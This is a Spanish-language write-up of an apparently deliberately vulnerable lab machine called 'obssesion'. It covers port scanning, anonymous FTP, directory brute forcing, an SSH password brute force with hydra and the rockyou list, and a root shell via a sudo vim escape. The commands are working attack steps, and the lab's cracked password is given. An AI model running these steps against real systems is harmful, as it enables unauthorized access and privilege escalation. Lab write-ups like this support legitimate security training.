---
Maquina: obssesion
SO: Linux
Explotación: Fuerza bruta
Escala_privs: Permisos sudo
Dificultad: Muy fácil
tags:
  - maquina
  - fuerza_bruta
  - escala_privs
  - linux
  - ssh
  - web_discovery
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

```bash 
nmap -p- --open --min-rate 5000 -sV -Pn 172.17.0.2
```

![[Pasted image 20241021134220.png]]

2. **Acceso al ftp mediante usuario Anonymous y descarga de documentos**:

![[Pasted image 20241021134332.png]]

3. **Análisis de los documentos descargados**:

![[Pasted image 20241021134500.png]]

Como se puede apreciar, hay un chat curioso con los usuarios Gonza y Russski (ya tenemos posibles nombres de usuario, también se menciona una tal Nágore):

4. **Investigación del portal web**:

Como hemos observado hay un portal web activo en el puerto 80, así que vamos a indagar en el a ver que encontramos.

Tras pasar la herramienta gobuster tenemos el siguiente resultado:

```bash 
gobuster dir -u http://172.17.0.2/ -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/common.txt
```

![[Pasted image 20241021135840.png]]

Si observamos en el path /backup nos ha dejado un mensaje importante:

![[Pasted image 20241021140154.png]]

Ahora ya sabemos que el usuario que utiliza es russoski.

## Explotación:

4. **Acceso al SSH por Fuerza Bruta**:

Con el usuario russoski, vamos a intentar hacer un ataque de hydra para poder acceder al SSH

```bash 
hydra -l russoski -P /home/alejandro/wordlists/rockyou.txt -t 5 -vvv ssh://172.17.0.2
```

![[Pasted image 20241022102036.png]]

Listo, ya sabemos la contraseña del usuario russoski -> iloveme

![[Pasted image 20241022102236.png]]

Una vez dentro ya podemos pasar a la escala de privilegios.

5. **Escala de privilegios**:

Para ver los permisos que tenemos con el comando sudo podemos ejecutar:

```bash 
sudo -l
```

![[Pasted image 20241022102302.png]]

Como podemos apreciar se puede ejecutar /usr/bin/vim como sudo.... Así que vamos a ir a la web de gtfobins para ver que comando podemos ejecutar link -> https://gtfobins.github.io/.

```bash 
sudo vim -c ':!/bin/sh'
```

![[Pasted image 20241022102441.png]]

Y ya tendríamos privilegios de root.